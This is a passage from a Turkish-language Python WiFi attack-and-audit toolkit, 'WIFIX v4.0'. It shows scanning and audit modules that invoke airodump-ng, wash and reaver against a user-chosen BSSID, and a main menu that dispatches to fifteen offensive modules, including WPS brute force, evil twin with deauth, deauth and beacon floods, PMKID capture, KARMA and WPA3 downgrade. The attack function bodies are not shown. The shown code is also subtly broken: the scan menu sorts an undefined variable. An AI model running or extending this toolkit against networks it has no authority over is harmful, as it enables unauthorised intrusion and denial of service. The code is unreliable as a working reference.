        channel_stats[ch] = {'signal': out[:80]}
    
    print(c(Colors.OKGREEN, "\n[+] Kanal analizi tamamlandı!"))
    print(f"    {len(channel_stats)} kanal taranmıştır.")
    
    # En iyi kanalları göster
    print(c(Colors.OKBLUE, "\n[*] Kanal kullanım önerisi:"))
    print("  En az gürültülü kanalları bulmak için WiFi taraması yapın.")
    print("  Genelde 1, 6, 11 çakışmayan kanallardır.")
    
    disable_monitor_mode(mon_iface)
    
    report_mgr.add('Channel_Analysis', {
        'channels_scanned': len(channel_stats),
        'channel_data': {str(k): v['signal'][:50] for k, v in channel_stats.items()}
    })
    return channel_stats

# ============================================================
# GUVENLIK MODUL 12: Gizli SSID Keşfi
# ============================================================

def sec_hidden_ssid_discovery(interface: str = None):
    """Gizli (hidden) SSID'leri probe response ile bulma"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S12] GİZLİ SSID KEŞFİ"))
    print(c(Colors.HEADER, "=" * 70))
    
    if not interface:
        ifaces = get_wireless_interfaces()
        if not ifaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayüz yok!"))
            return
        interface = ifaces[0]
    
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return
    
    duration = input(c(Colors.OKCYAN, "[?] Dinleme süresi (sn, boş=30): "))
    duration = int(duration) if duration else 30
    
    print(c(Colors.OKCYAN, f"\n[*] {duration}s boyunca gizli SSID'ler dinleniyor..."))
    print(c(Colors.WARNING, "[*] İstemciler probe request gönderene kadar beklenir...\n"))
    
    try:
        from scapy.all import sniff, Dot11, Dot11ProbeReq, Dot11Elt
    except ImportError:
        print(c(Colors.FAIL, "[!] Scapy gerekli!"))
        return
    
    hidden_ssids = []
    probe_count = [0]
    
    def probe_handler(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            probe_count[0] += 1
            probe_ssid = ""
            if pkt.haslayer(Dot11Elt):
                for elt in pkt[Dot11Elt]:
                    if elt.ID == 0:
                        try:
                            probe_ssid = elt.info.decode('utf-8', errors='ignore')
                        except:
                            probe_ssid = ""
            
            if probe_ssid and probe_ssid not in hidden_ssids:
                hidden_ssids.append(probe_ssid)
                print(c(Colors.OKGREEN, f"  [+] Keşfedilen gizli SSID: {probe_ssid}"))
    
    try:
        sniff(iface=mon_iface, prn=probe_handler, timeout=duration, store=0)
    except KeyboardInterrupt:
        pass
    
    if hidden_ssids:
        print(c(Colors.OKGREEN, f"\n[+] ✓ {len(hidden_ssids)} gizli SSID keşfedildi:"))
        for ssid in sorted(set(hidden_ssids)):
            print(f"  - {ssid}")
    else:
        print(c(Colors.WARNING, "\n[!] Hiç gizli SSID keşfedilemedi."))
        print(c(Colors.OKBLUE, "    İpucu: Bir istemcinin probe request göndermesi gerekir."))
    
    print(c(Colors.OKBLUE, f"\n[*] Toplam probe request: {probe_count[0]}"))
    
    disable_monitor_mode(mon_iface)
    
    report_mgr.add('Hidden_SSID', {
        'duration': duration,
        'hidden_ssids_found': hidden_ssids,
        'probe_count': probe_count[0]
    })
    return hidden_ssids

# ============================================================
# GUVENLIK MODUL 13: WPS Güvenlik Denetimi
# ============================================================

def sec_wps_audit(interface: str = None):
    """WPS lock durumu, PIN zayıflık testi, güvenlik denetimi"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S13] WPS GÜVENLİK DENETİMİ"))
    print(c(Colors.HEADER, "=" * 70))
    
    if not interface:
        ifaces = get_wireless_interfaces()
        if not ifaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayüz yok!"))
            return
        interface = ifaces[0]
    
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return
    
    print(c(Colors.OKCYAN, "\n[*] Wash ile WPS ağları taranıyor (15 sn)..."))
    ret, out, err = run_command(f"wash -i {mon_iface} -C 2>/dev/null", timeout=20)
    
    print(c(Colors.OKBLUE, "\n[*] WPS tarama sonuçları:"))
    if out:
        print(out)
    
    # Manuel BSSID sorgula
    bssid = input(c(Colors.OKCYAN, "\n[?] Detaylı kontrol için BSSID (boş=geç): "))
    
    if bssid and len(bssid) == 17:
        print(c(Colors.OKCYAN, f"\n[*] WPS güvenlik kontrolleri: {bssid}"))
        
        # Lock durumu kontrolü (reaver ile)
        ret2, out2, _ = run_command(f"reaver -i {mon_iface} -b {bssid} -vv -L -N -T 1 "
                                     f"-d 0 -c 3 2>&1 | head -30", timeout=10)
        
        if 'WPS locked' in out2.lower() or 'lock' in out2.lower():
            print(c(Colors.FAIL, "  ⚠️ WPS KİLİTLİ! Brute force koruması aktif."))
        elif 'WPS' in out2:
            print(c(Colors.WARNING, "  ⚠️ WPS AÇIK! Zafiyetli olabilir."))
        else:
            print(c(Colors.OKGREEN, "  ✓ WPS yanıt vermiyor (kapalı olabilir)."))
        
        print(c(Colors.OKBLUE, f"\n[*] Reaver çıktısı:\n{out2[:500]}"))
    
    disable_monitor_mode(mon_iface)
    
    report_mgr.add('WPS_Audit', {
        'bssid_checked': bssid if bssid else None,
        'wash_output': out[:500] if out else None
    })
    return True

# ============================================================
# GUVENLIK MODUL 14: Şifreleme Denetimi
# ============================================================

def sec_encryption_audit(interface: str = None):
    """WEP/WPA/WPA2/WPA3 şifreleme denetimi"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S14] ŞİFRELEME DENETİMİ"))
    print(c(Colors.HEADER, "=" * 70))
    
    if not interface:
        ifaces = get_wireless_interfaces()
        if not ifaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayüz yok!"))
            return
        interface = ifaces[0]
    
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return
    
    print(c(Colors.OKCYAN, "\n[*] Ağlar taranıyor (15 sn)..."))
    nets, _ = wifi_scan(mon_iface, duration=15)
    
    if not nets:
        print(c(Colors.FAIL, "[!] Hiç ağ bulunamadı!"))
        disable_monitor_mode(mon_iface)
        return
    
    print(c(Colors.OKBLUE, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  ŞİFRELEME GÜVENLİK RAPORU"))
    print(c(Colors.OKBLUE, "=" * 70))
    
    # Güvenlik skorlaması
    scores = {'WEP': 1, 'WPA': 3, 'WPA2': 7, 'WPA3': 10, 'OPN': 0}
    risk_colors = {0: Colors.FAIL, 1: Colors.FAIL, 3: Colors.WARNING, 
                   7: Colors.OKGREEN, 10: Colors.OKGREEN}
    
    for net in sorted(nets, key=lambda x: x.get('power', '0')):
        privacy = net.get('privacy', 'OPN').strip()
        essid = net.get('essid', '')
        bssid = net['bssid']
        power = net.get('power', '0')
        
        # Temel güvenlik tespiti
        if 'WPA3' in privacy:
            score = 10; proto = 'WPA3'; secure = True
        elif 'WPA2' in privacy:
            score = 7; proto = 'WPA2'; secure = True
        elif 'WPA' in privacy:
            score = 3; proto = 'WPA'; secure = False
        elif 'WEP' in privacy:
            score = 1; proto = 'WEP'; secure = False
        else:
            score = 0; proto = 'AÇIK'; secure = False
        
        color = risk_colors.get(score, Colors.WARNING)
        icon = '🔒' if secure else ('⚠️' if score > 0 else '🚫')
        
        print(f"\n  {icon} {color}{essid[:25]:<25} {proto:<8} Sinyal:{power} dBm{Colors.ENDC}")
        print(f"     BSSID: {bssid}")
        print(f"     Şifreleme: {privacy:<20} Güvenlik Puanı: {color}{score}/10{Colors.ENDC}")
        
        if score <= 3:
            print(f"     {c(Colors.FAIL, '→ ZAFİYETLİ! Saldırıya açık!')}")
        elif score == 7:
            print(f"     {c(Colors.WARNING, '→ Orta güvenlik. WPA3'e geçilmesi önerilir.')}")
        else:
            print(f"     {c(Colors.OKGREEN, '→ Güvenli yapılandırma.')}")
    
    # Özet
    total = len(nets)
    open_nets = sum(1 for n in nets if n.get('privacy', 'OPN').strip() in ('OPN', ''))
    weak_nets = sum(1 for n in nets if 'WEP' in n.get('privacy', '') or 
                    ('WPA' in n.get('privacy','') and 'WPA2' not in n.get('privacy','')
                     and 'WPA3' not in n.get('privacy','')))
    secure_nets = sum(1 for n in nets if 'WPA2' in n.get('privacy','') or 'WPA3' in n.get('privacy',''))
    
    print(c(Colors.OKBLUE, f"\n{'='*70}"))
    print(c(Colors.BOLD, "  ÖZET"))
    print(c(Colors.OKBLUE, f"{'='*70}"))
    print(f"  Toplam ağ: {total}")
    print(f"  {c(Colors.FAIL)}Açık ağ: {open_nets}{c(Colors.ENDC)}")
    print(f"  {c(Colors.WARNING)}Zayıf şifreleme: {weak_nets}{c(Colors.ENDC)}")
    print(f"  {c(Colors.OKGREEN)}Güvenli (WPA2/WPA3): {secure_nets}{c(Colors.ENDC)}")
    
    disable_monitor_mode(mon_iface)
    
    report_mgr.add('Encryption_Audit', {
        'total_nets': total,
        'open_nets': open_nets,
        'weak_nets': weak_nets,
        'secure_nets': secure_nets
    })
    return nets

# ============================================================
# GUVENLIK MODUL 15: WiFi Zafiyet Taraması (Toplu)
# ============================================================

def sec_vulnerability_scan(interface: str = None):
    """Tüm WiFi zafiyetlerini tek seferde tara"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S15] WIFI ZAFİYET TARAMASI (TOPLU)"))
    print(c(Colors.HEADER, "=" * 70))
    
    print(c(Colors.WARNING, "\n[!] Bu modül tüm güvenlik kontrollerini tek seferde çalıştırır."))
    print(c(Colors.WARNING, "[!] 3-5 dakika sürebilir.\n"))
    
    confirm = input(c(Colors.OKCYAN, "[?] Devam? (e/h): "))
    if confirm.lower() != 'e':
        return False
    
    if not interface:
        ifaces = get_wireless_interfaces()
        if not ifaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayüz yok!"))
            return
        interface = ifaces[0]
    
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return
    
    vulnerabilities = []
    scan_start = time.time()
    
    # 1. Ağ taraması
    print(c(Colors.OKCYAN, "\n[1/5] Ağ taraması..."))
    nets, _ = wifi_scan(mon_iface, duration=15)
    
    if not nets:
        print(c(Colors.FAIL, "[!] Hiç ağ bulunamadı!"))
        disable_monitor_mode(mon_iface)
        return
    
    # 2. Güvenlik denetimi
    print(c(Colors.OKCYAN, "[2/5] Şifreleme denetimi..."))
    for net in nets:
        privacy = net.get('privacy', '').strip()
        essid = net.get('essid', '')
        bssid = net['bssid']
        
        if 'WEP' in privacy:
            vulnerabilities.append(f"WEP KULLANIMI - {essid} ({bssid}) - Çok zayıf")
        elif privacy in ('OPN', ''):
            vulnerabilities.append(f"AÇIK AĞ - {essid} ({bssid}) - Şifre yok")
        elif 'WPA' in privacy and 'WPA2' not in privacy and 'WPA3' not in privacy:
            vulnerabilities.append(f"WPA TKIP - {essid} ({bssid}) - Zayıf protokol")
    
    # 3. WPS kontrolü
    print(c(Colors.OKCYAN, "[3/5] WPS güvenlik kontrolü..."))
    ret, out, _ = run_command(f"wash -i {mon_iface} -C 2>/dev/null", timeout=15)
    if out and 'WPS' in out:
        for line in out.split('\n'):
            if len(line) > 50 and 'WPS' in line:
                bssid_check = line[:17].strip()
                if len(bssid_check) == 17:
                    vulnerabilities.append(f"WPS AÇIK - {bssid_check} - PIN brute riski")
    
    # 4. Rogue AP tespiti
    print(c(Colors.OKCYAN, "[4/5] Rogue AP tespiti..."))
    bssid_essid_map = {}
    for net in nets:
        e = net.get('essid', '')
        b = net['bssid']
        if e in bssid_essid_map and bssid_essid_map[e] != b:
            vulnerabilities.append(f"EVIL TWIN RİSKİ - {e} - Birden çok BSSID")
        bssid_essid_map[e] = b
    
    # 5. Kanal güvenliği
    print(c(Colors.OKCYAN, "[5/5] Kanal ve sinyal analizi..."))
    channels = [net.get('channel', '') for net in nets]
    channel_counts = Counter(channels)
    crowded = [ch for ch, cnt in channel_counts.items() if cnt > 5 and ch]
    if crowded:
        vulnerabilities.append(f"KALABALIK KANAL - {', '.join(map(str, crowded))} - Parazit riski")
    
    elapsed = time.time() - scan_start
    
    # RAPOR
    print(c(Colors.HEADER, f"\n{'='*70}"))
    print(c(Colors.BOLD, f"  WIFI ZAFİYET TARAMA RAPORU"))
    print(c(Colors.HEADER, f"{'='*70}"))
    print(f"  Süre: {elapsed:.1f}s | Ağ: {len(nets)} | Zafiyet: {len(vulnerabilities)}")
    
    if vulnerabilities:
        print(c(Colors.FAIL, f"\n[!] {len(vulnerabilities)} zafiyet tespit edildi:\n"))
        for i, vuln in enumerate(vulnerabilities, 1):
            if 'WEP' in vuln or 'AÇIK' in vuln:
                print(f"  {c(Colors.FAIL)}CRITICAL{i}. {vuln}")
            elif 'WPS' in vuln or 'EVIL' in vuln:
                print(f"  {c(Colors.WARNING)}HIGH    {i}. {vuln}")
            elif 'TKIP' in vuln:
                print(f"  {c(Colors.WARNING)}MEDIUM  {i}. {vuln}")
            else:
                print(f"  {c(Colors.OKBLUE)}LOW     {i}. {vuln}")
            print(f"     {c(Colors.ENDC)}")
    else:
        print(c(Colors.OKGREEN, "\n[+] ✓ Zafiyet tespit edilmedi."))
    
    # Güvenlik puanı
    vuln_scores = {'CRITICAL': 10, 'HIGH': 5, 'MEDIUM': 3, 'LOW': 1}
    total_score = sum(vuln_scores.get(
        'CRITICAL' if 'WEP' in v or 'AÇIK' in v else
        'HIGH' if 'WPS' in v or 'EVIL' in v else
        'MEDIUM' if 'TKIP' in v else 'LOW', 0
    ) for v in vulnerabilities)
    
    max_score = len(nets) * 10
    security_pct = max(0, 100 - (total_score / max(1, max_score)) * 100)
    
    print(f"\n  {c(Colors.BOLD)}GÜVENLİK PUANI: ", end='')
    if security_pct >= 80:
        print(c(Colors.OKGREEN, f"%{security_pct:.0f}/100 - İYİ"))
    elif security_pct >= 50:
        print(c(Colors.WARNING, f"%{security_pct:.0f}/100 - ORTA"))
    else:
        print(c(Colors.FAIL, f"%{security_pct:.0f}/100 - ZAYIF"))
    
    disable_monitor_mode(mon_iface)
    
    report_mgr.add('Vulnerability_Scan', {
        'duration': elapsed,
        'nets_found': len(nets),
        'vulnerabilities': vulnerabilities,
        'security_score': f"%{security_pct:.0f}"
    })
    return vulnerabilities

# ============================================================
# YARDIMCI: WiFi Tarama
# ============================================================

def wifi_scan(interface: str = None, duration: int = 15) -> Tuple[List[Dict], Optional[str]]:
    """WiFi ağlarını tara ve detaylı liste döndür"""
    if not interface:
        ifaces = get_wireless_interfaces()
        if not ifaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayüz bulunamadı!"))
            return [], None
        interface = ifaces[0]
    
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return [], None
    
    print(c(Colors.OKCYAN, f"[*] WiFi taranıyor ({mon_iface}, {duration}s)..."))
    
    output_file = f"/tmp/wifiscan_{int(time.time())}"
    dump_proc = run_bg(f"airodump-ng {mon_iface} -w {output_file} "
                        f"--output-format csv --beacons 2>/dev/null")
    
    for i in range(duration, 0, -1):
        print(f"\r[*] Kalan: {i:2d}s | Paket toplanıyor...", end='', flush=True)
        time.sleep(1)
    print()
    
    dump_proc.terminate()
    time.sleep(1)
    
    networks = []
    csv_file = f"{output_file}-01.csv"
    
    if os.path.exists(csv_file):
        with open(csv_file, 'r', errors='ignore') as f:
            lines = f.readlines()
        
        in_aps = False
        for line in lines:
            if 'BSSID' in line and 'First time seen' in line:
                in_aps = True
                continue
            if in_aps and 'Station MAC' in line:
                break
            if in_aps and line.strip():
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14:
                    bssid = parts[0]
                    if len(bssid) == 17 and ':' in bssid:
                        net = {
                            'bssid': bssid, 'channel': parts[3],
                            'speed': parts[4], 'privacy': parts[5],
                            'cipher': parts[6], 'auth': parts[7],
                            'power': parts[8], 'beacons': parts[9],
                            'iv': parts[10], 'essid': parts[13],
                            'clients': []
                        }
                        networks.append(net)
        
        os.remove(csv_file)
    
    # Temizlik
    for f in os.listdir('/tmp'):
        if f.startswith(f"wifiscan_{int(time.time())-120}"):
            try: os.remove(f"/tmp/{f}")
            except: pass
    
    return networks, mon_iface


def wifi_scan_menu(interface: str = None):
    """WiFi tarama menüsü (ana menüden çağrılır)"""
    nets, mon_iface = wifi_scan(interface, duration=15)
    
    if not nets:
        print(c(Colors.WARNING, "[!] Hiç ağ bulunamadı!"))
        return nets, mon_iface
    
    print(c(Colors.OKGREEN, f"\n[+] {len(nets)} ağ bulundu:"))
    print("-" * 100)
    print(f"{'#':<4} {'ESSID':<28} {'BSSID':<18} {'CH':<4} {'Sinyal':<7} {'Güvenlik':<15} {'Kripto':<10}")
    print("-" * 100)
    
    networks.sort(key=lambda x: int(x.get('power', 0)) if x.get('power','0').replace('-','').isdigit() else 0, reverse=True)
    
    for i, net in enumerate(nets[:30], 1):
        essid = net.get('essid', '')
        if not essid or essid == '\\x00':
            essid = '<Gizli>'
        power = net.get('power', 'N/A')
        privacy = net.get('privacy', 'OPN').strip()
        
        try:
            pwr_int = abs(int(power))
            if pwr_int <= 60:
                pwr_disp = c(Colors.OKGREEN, str(power))
            elif pwr_int <= 80:
                pwr_disp = c(Colors.WARNING, str(power))
            else:
                pwr_disp = c(Colors.FAIL, str(power))
        except:
            pwr_disp = power
        
        cipher = net.get('cipher', '').strip()
        auth = net.get('auth', '').strip()
        sec_info = f"{privacy}/{auth}" if auth else privacy
        
        print(f"{i:<4} {essid:<28} {net['bssid']:<18} {net.get('channel','?'):<4} {pwr_disp:<7} {sec_info:<15} {cipher:<10}")
    
    return nets, mon_iface

# ============================================================
# ANA MENÜ - 30+ ARAÇ
# ============================================================

def main_menu():
    banner()
    check_root()
    check_dependencies()
    
    ifaces = get_wireless_interfaces()
    default_iface = ifaces[0] if ifaces else "wlan0"
    mon_iface = None
    current_iface = default_iface
    
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        
        mon_status = c(Colors.OKGREEN, f"({mon_iface})") if mon_iface else c(Colors.WARNING, "(Kapalı)")
        
        print(f"\n  {c(Colors.OKBLUE, '📡 Arayüz:')} {current_iface} {mon_status}")
        
        print(f"\n  {c(Colors.FAIL, '═══ HACK MODÜLLERİ (15) ═══')}")
        print(f"  {c(Colors.BOLD, '[H1]')}  WPA/WPA2 Handshake Saldırısı")
        print(f"  {c(Colors.BOLD, '[H2]')}  WPS PIN (Reaver) Brute Force")
        print(f"  {c(Colors.BOLD, '[H3]')}  WPS Pixie Dust (Bully)")
        print(f"  {c(Colors.BOLD, '[H4]')}  WEP IV Toplama & Kırma")
        print(f"  {c(Colors.BOLD, '[H5]')}  Evil Twin + Deauth Kombinasyon")
        print(f"  {c(Colors.BOLD, '[H6]')}  PMKID Hash Yakalama")
        print(f"  {c(Colors.BOLD, '[H7]')}  Beacon Flood (Sahte AP Taşkını)")
        print(f"  {c(Colors.BOLD, '[H8]')}  Deauth Flood Saldırısı")
        print(f"  {c(Colors.BOLD, '[H9]')}  Probe Request Flood")
        print(f"  {c(Colors.BOLD, '[H10]')} EAPOL Log Toplayıcı")
        print(f"  {c(Colors.BOLD, '[H11]')} KARMA Saldırısı")
        print(f"  {c(Colors.BOLD, '[H12]')} WPA3 Downgrade Saldırısı")
        print(f"  {c(Colors.BOLD, '[H13]')} Beacon Frame Enjeksiyonu")
        print(f"  {c(Colors.BOLD, '[H14]')} Bettercap WiFi Hacking")
        print(f"  {c(Colors.BOLD, '[H15]')} Ettercap WiFi MITM")
        
        print(f"\n  {c(Colors.OKGREEN, '═══ GÜVENLİK MODÜLLERİ (15) ═══')}")
        print(f"  {c(Colors.BOLD, '[S1]')}  Bettercap MITM Framework")
        print(f"  {c(Colors.BOLD, '[S2]')}  Ettercap MITM Framework")
        print(f"  {c(Colors.BOLD, '[S3]')}  Port Tarama (Nmap)")
        print(f"  {c(Colors.BOLD, '[S4]')}  Ağ Trafiği Analizi")
        print(f"  {c(Colors.BOLD, '[S5]')}  IP/Cihaz Keşfi")
        print(f"  {c(Colors.BOLD, '[S6]')}  ARP Spoofing Tespiti")
        print(f"  {c(Colors.BOLD, '[S7]')}  Ağ Haritalama & Topoloji")
        print(f"  {c(Colors.BOLD, '[S8]')}  Güvenlik Raporlama & Log")
        print(f"  {c(Colors.BOLD, '[S9]')}  Sahte AP (Rogue) Tespiti")
        print(f"  {c(Colors.BOLD, '[S10]')} Deauth Saldırı Tespiti")
        print(f"  {c(Colors.BOLD, '[S11]')} Kanal Analizi & RF Tarama")
        print(f"  {c(Colors.BOLD, '[S12]')} Gizli SSID Keşfi")
        print(f"  {c(Colors.BOLD, '[S13]')} WPS Güvenlik Denetimi")
        print(f"  {c(Colors.BOLD, '[S14]')} Şifreleme Denetimi")
        print(f"  {c(Colors.BOLD, '[S15]')} WiFi Zafiyet Taraması")
        
        print(f"\n  {c(Colors.OKBLUE, '═══ YARDIMCI ═══')}")
        print(f"  {c(Colors.BOLD, '[W]')}  WiFi Ağ Tarama")
        print(f"  {c(Colors.BOLD, '[M]')}  MAC Adresi Değiştir")
        print(f"  {c(Colors.BOLD, '[R]')}  Rapor Kaydet (JSON/HTML)")
        print(f"  {c(Colors.BOLD, '[I]')}  Ağ Bilgilerim")
        print(f"  {c(Colors.BOLD, '[0]')}  Çıkış")
        
        choice = input(c(Colors.OKCYAN, f"\n  [?] Seçim (H1-15, S1-15, W, M, R, I, 0): ")).strip().upper()
        
        # HACK MODÜLLERİ
        if choice == '0':
            if mon_iface:
                disable_monitor_mode(mon_iface)
            print(c(Colors.OKGREEN, "\n[+] WIFIX v4.0 kapandı. Güvenli günler!"))
            break
        
        elif choice == 'W':
            nets, mon_iface = wifi_scan_menu(current_iface)
            if mon_iface:
                current_iface = mon_iface
            input(c(Colors.OKCYAN, "\n  [*] Devam için Enter..."))
            continue
        
        elif choice == 'M':
            if ifaces:
                randomize_mac(ifaces[0])
            input(c(Colors.OKCYAN, "\n  [*] Devam için Enter..."))
            continue
        
        elif choice == 'R':
            print(c(Colors.OKCYAN, "\n  [*] Rapor seçenekleri:"))
            print("  1 - JSON rapor kaydet")
            print("  2 - HTML rapor kaydet")
            rch = input(c(Colors.OKCYAN, "  [?] Seçim (1-2): "))
            if rch == '1':
                report_mgr.save()
            elif rch == '2':
                report_mgr.save_html()
            input(c(Colors.OKCYAN, "\n  [*] Devam için Enter..."))
            continue
        
        elif choice == 'I':
            print(c(Colors.OKBLUE, f"\n  🌐 Genel IP: {get_public_ip()}"))
            print(f"  📡 Arayüzler: {', '.join(get_all_interfaces())}")
            print(f"  📶 Kablosuz: {', '.join(get_wireless_interfaces()) or 'Yok'}")
            print(f"  🚪 Gateway: {get_default_gateway()}")
            print(f"  📍 Ağ: {get_local_network()}")
            if mon_iface:
                ret, out, _ = run_command(f"iwconfig {mon_iface} 2>/dev/null | head -3")
                print(f"  {out[:100]}")
            input(c(Colors.OKCYAN, "\n  [*] Devam için Enter..."))
            continue
        
        # HACK modülleri (monitor mod gerektirir)
        hack_modules = ['H1', 'H2', 'H3', 'H4', 'H5', 'H6', 'H7', 'H8', 'H9', 
                       'H10', 'H11', 'H12', 'H13', 'H14', 'H15']
        
        if choice in hack_modules:
            if not mon_iface:
                print(c(Colors.WARNING, "[!] Önce WiFi taraması yapın (W)"))
                nets, mon_iface = wifi_scan_menu(current_iface)
                if mon_iface:
                    current_iface = mon_iface
            
            if mon_iface:
                if choice == 'H1': hack_wpa_handshake(mon_iface)
                elif choice == 'H2': hack_wps_reaver(mon_iface)
                elif choice == 'H3': hack_wps_pixie(mon_iface)
                elif choice == 'H4': hack_wep(mon_iface)
                elif choice == 'H5': hack_evil_twin(mon_iface)
                elif choice == 'H6': hack_pmkid(mon_iface)
                elif choice == 'H7': hack_beacon_flood(mon_iface)
                elif choice == 'H8': hack_deauth_flood(mon_iface)
                elif choice == 'H9': hack_probe_request_flood(mon_iface)
                elif choice == 'H10': hack_eapol_capture(mon_iface)
                elif choice == 'H11': hack_karma(mon_iface)
                elif choice == 'H12': hack_wpa3_downgrade(mon_iface)
                elif choice == 'H13': hack_beacon_inject(mon_iface)
                elif choice == 'H14': hack_bettercap_wifi(mon_iface)
                elif choice == 'H15': hack_ettercap_wifi()
            
            input(c(Colors.OKCYAN, "\n  [*] Devam için Enter..."))
            continue
        
        # GÜVENLİK modülleri
        sec_modules = {'S1': sec_bettercap_mitm, 'S2': sec_ettercap_mitm,
                      'S3': sec_port_scan, 'S4': sec_traffic_monitor,
                      'S5': sec_device_discovery, 'S6': sec_arp_detection,
                      'S7': sec_network_mapping, 'S8': sec_reporting,
                      'S9': sec_rogue_ap_detection, 'S10': sec_deauth_detection,
                      'S11': sec_channel_analysis, 'S12': sec_hidden_ssid_discovery,
                      'S13': sec_wps_audit, 'S14': sec_encryption_audit,
                      'S15': sec_vulnerability_scan}
        
        if choice in sec_modules:
            func = sec_modules[choice]
            if choice in ('S4', 'S9', 'S10', 'S11', 'S12', 'S13', 'S14', 'S15'):
                func(current_iface if not mon_iface else (mon_iface or current_iface))
            else:
                func()
            input(c(Colors.OKCYAN, "\n  [*] Devam için Enter..."))
            continue
        
        print(c(Colors.FAIL, f"\n  [!] Geçersiz seçim: {choice}"))
        time.sleep(1)
